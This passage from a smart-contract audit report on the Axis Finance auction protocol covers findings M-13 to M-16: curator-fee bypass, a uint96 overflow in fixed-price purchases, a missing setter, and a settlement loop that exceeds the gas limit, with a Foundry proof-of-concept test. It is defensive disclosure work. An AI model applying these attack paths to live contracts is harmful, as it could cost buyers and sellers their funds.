+        function calculateQuoteFees(
+        uint96 protocolFee_,
+        uint96 referrerFee_,
+        bool hasReferrer_,
+        uint96 amount_
+    ) public pure returns (uint96 toReferrer, uint96 toProtocol) {
+        uint _FEE_DECIMALS = 5;
+        uint96 feeDecimals = uint96(_FEE_DECIMALS);
+
+        if (hasReferrer_) {
+            // In this case we need to:
+            // 1. Calculate referrer fee
+            // 2. Calculate protocol fee as the total expected fee amount minus the referrer fee
+            //    to avoid issues with rounding from separate fee calculations
+            toReferrer = uint96(
+                FixedPointMathLib.mulDivDown(amount_, referrerFee_, feeDecimals)
+            );
+            toProtocol =
+                uint96(
+                    FixedPointMathLib.mulDivDown(
+                        amount_,
+                        protocolFee_ + referrerFee_,
+                        feeDecimals
+                    )
+                ) -
+                toReferrer;
+        } else {
+            // If there is no referrer, the protocol gets the entire fee
+            toProtocol = uint96(
+                FixedPointMathLib.mulDivDown(
+                    amount_,
+                    protocolFee_ + referrerFee_,
+                    feeDecimals
+                )
+            );
+        }
+    }
+
+
     // ===== Helper Functions ===== //
 
     function _mulDivUp(uint96 mul1_, uint96 mul2_, uint96 div_) internal pure returns (uint96) {

```

## Impact

Rewards might not be collectible or seller might not be able to claim the proceeds due to lack of tokens

## Code Snippet

inaccurate computation of the input quote token value for allocating fees
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/AuctionHouse.sol#L512-L515

## Tool used

Manual Review

## Recommendation

Use `bidAmount - pfRefund` as the quote token input amount value instead of computing the current way



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/Axis-Fi/moonraker/pull/119.

# Issue M-13: Max curator fee would be bypassed for existing curators 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/183 

## Found by 
hash
## Summary
Max curator fee would be bypassed for existing curators

## Vulnerability Detail

In the protocol, the admin can set the max fees for curation

```solidity
    function setFee(Keycode auctionType_, FeeType type_, uint48 fee_) external override onlyOwner {
        // Check that the fee is a valid percentage
        if (fee_ > _FEE_DECIMALS) revert InvalidFee();


        // Set fee based on type
        // Or a combination of protocol and referrer fee since they are both in the quoteToken?
        if (type_ == FeeType.Protocol) {
            fees[auctionType_].protocol = fee_;
        } else if (type_ == FeeType.Referrer) {
            fees[auctionType_].referrer = fee_;
        } else if (type_ == FeeType.MaxCurator) {
            fees[auctionType_].maxCuratorFee = fee_;
        }
```

But even if the max curator fee is lowered, a curator can enjoy their old fees (which can be higher than the current max curator fees) since the curate function doesn't check for this condition

```solidity
    function curate(uint96 lotId_, bytes calldata callbackData_) external nonReentrant {
        
        ....

        feeData.curated = true;
        feeData.curatorFee = fees[keycodeFromVeecode(routing.auctionReference)].curator[msg.sender];
```

## Impact

Curators can obtain a fee higher than the max fee

## Code Snippet

curate function doesn't check the max fee constraint
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/AuctionHouse.sol#L652

## Tool used

Manual Review

## Recommendation

When fetching the fees inside the curate function, check if the fee is greater than the current max curator fee. If this is the case, set the fees to the max curator fee



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/Axis-Fi/moonraker/pull/124.

# Issue M-14: Unsafe casting within _purchase function can result in overflow 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/204 

## Found by 
FindEverythingX
## Summary
Unsafe casting within _purchase function can result in overflow

## Vulnerability Detail
Contract: FPAM.sol

The _purchase function is invoked whenever a user wants to buy some tokens from an FPAM auction. 

Note how the amount_ parameter is from type uint96:

[https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/FPAM.sol#L128](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/FPAM.sol#L128)

The payout is then calculated as follows:

amount * 10^baseTokenDecimals / price

[https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/FPAM.sol#L135](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/FPAM.sol#L135)

The crux: The quote token can be with 6 decimals and the base token with 18 decimals.

This would then potentially result in an overflow and the payout is falsified. 

Consider the following PoC:

amount = 1_000_000_000e6 (fees can be deducted or not, this does not matter for this PoC)

baseTokenDecimals = 18

price = 1e4

This price basically means, a user will receive 1e18 BASE tokens for 1e4 (0.01) QUOTE tokens, respectively a user must provide 1e4 (0.01) QUOTE tokens to receive 1e18 BASE tokens

The calculation would be as follows:

1_000_000_000e6 * 1e18 / 1e4 = 1e29

while uint96.max = 7.922….e28

Therefore, the result will be casted to uint96 and overflow, it would effectively manipulate the auction outcome, which can result in a loss of funds for the buyer, because he will receive less BASE tokens than expected (due to the overflow).

It is clear that this calculation example can work on multiple different scenarios (even though only very limited because of the high bidding [amount] size) . However, using BASE token with 18 decimals and QUOTE token with 6 decimals will more often result in such an issue.

This issue is only rated as medium severity because the buyer can determine a minAmountOut parameter. The problem is however the auction is a fixed price auction and the buyer already knows the price and the amount he provides, which gives him exactly the fixed output amount. Therefore, there is usually absolutely no slippage necessity to be set by the buyer and lazy buyers might just set this to zero.

## Impact
IMPACT:

a) Loss of funds for buyer


## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/FPAM.sol#L128
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/FPAM.sol#L135


## Tool used

Manual Review

## Recommendation
Consider simply switching to a uint256 approach, this should be adapted in the overall architecture. The only important thing (as far as I have observed) is to make sure the heap mechanism does not overflow when calculating the relative values:

[https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/lib/MaxPriorityQueue.sol#L114](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/lib/MaxPriorityQueue.sol#L114)



## Discussion

**0xJem**

I would rate this low priority.

It is possible, but highly unlikely as it requires all of these conditions to be met:
- The lot capacity would need to be close to the maximum (uint96 max)
- The max payout needs to be 100%
- The quote token decimals need to be low
- The price needs to be low

**Oighty**

I do think this is valid. I'll leave it up to the judge to determine severity. The fact that the buyer can receive much fewer tokens than expected, even in an outlandish scenario, shouldn't be possible.

# Issue M-15: No setter for minAuctionDuration 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/224 

## Found by 
hash
## Summary
No setter for minAuctionDuration

## Vulnerability Detail

The `minAuctionDuration` parameters lacks setter functions

```solidity
    uint48 public minAuctionDuration;
```
```solidity
    constructor(address auctionHouse_) AuctionModule(auctionHouse_) {
        // Set the minimum auction duration to 1 day initially
        minAuctionDuration = 1 days;
    }
```

## Impact

minAuctionDuration cannot be updated and hence the protocol is stuck with the same duration unless an upgrade is made

## Code Snippet

https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/auctions/FPAM.sol#L47-L50

## Tool used

Manual Review

## Recommendation

Add a function to set `minAuctionDuration`



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/Axis-Fi/moonraker/pull/117.

**nevillehuang**

Not sure if medium severity is appropriate, given no core contract functionality broken even if minimum auction duration is forever not changed. The comment of `// Set the minimum auction duration to 1 day initially` does make it seem like protocol intended for this parameter to be changed in the future


# Issue M-16: Settlement of batch auction can exceed the gas limit 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/237 

## Found by 
0xR360, MrjoryStewartBaxter, flacko, shaka
## Summary

Settlement of batch auction can exceed the gas limit, making it impossible to settle the auction.

## Vulnerability Detail

When a batch auction (EMPAM) is settled, to calculate the lot marginal price, the contract [iterates over all bids](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol#L611-L651) until the capacity is reached or a bid below the minimum price is found. 

As some of the operations performed in the loop are gas-intensive, the contract may run out of gas if the number of bids is too high.

Note that additionally, there is [another loop](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol#L772-L781) in the `_settle` function that iterates over all the remaining bids to delete them from the queue. While this loop consumes much less gas per iteration and would require the number of bids to be much higher to run out of gas, it adds to the problem.

## Impact

Settlement of batch auction will revert, causing sellers and bidders to lose their funds.

## Code Snippet

https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol#L611-L651

## Proof of concept

Change the minimum bid percent to 0.1% in the `EmpaModuleTest` contract in `EMPAModuleTest.sol`.

```diff
-   uint24 internal constant _MIN_BID_PERCENT = 1000; // 1%
+   uint24 internal constant _MIN_BID_PERCENT = 100; // 0.1%
```

Add the following code to the contract `EmpaModuleSettleTest` in `settle.t.sol` and run `forge test --mt test_settleOog`.

```solidity
modifier givenBidsCreated() {
    uint96 amountOut = 0.01e18;
    uint96 amountIn = 0.01e18;
    uint256 numBids = 580;

    for (uint256 i = 0; i < numBids; i++) {
        _createBid(_BIDDER, amountIn, amountOut);
    }
    
    _;
}

function test_settleOog() external
    givenLotIsCreated
    givenLotHasStarted
    givenBidsCreated
    givenLotHasConcluded
    givenPrivateKeyIsSubmitted
    givenLotIsDecrypted
{        
    uint256 gasBefore = gasleft();
    _settle();

    assert(gasBefore - gasleft() > 30_000_000);
}
```

## Tool used

Manual Review

## Recommendation

An easy way to tackle the issue would be to change the `_MIN_BID_PERCENT` value from 10 (0.01%) to 1000 (1%) in the `EMPAM.sol` contract, which would limit the number of iterations to 100.

A more appropriate solution, if it is not acceptable to increase the min bid percent, would be to change the settlement logic so that can be handled in batches of bids to avoid running out of gas.

In both cases, it would also be recommended to limit the number of decrypted bids that can be deleted from the queue in a single transaction.



## Discussion

**Oighty**

Acknowledge. This is valid. We had changed the queue implementation to be less gas intensive on inserts, but it ended up making removals (i.e. settle) more expensive. A priority for us is supporting as many bids on settlement as we can (which allows smaller bid sizes). We're likely going to switch to a linked list implementation to achieve this.

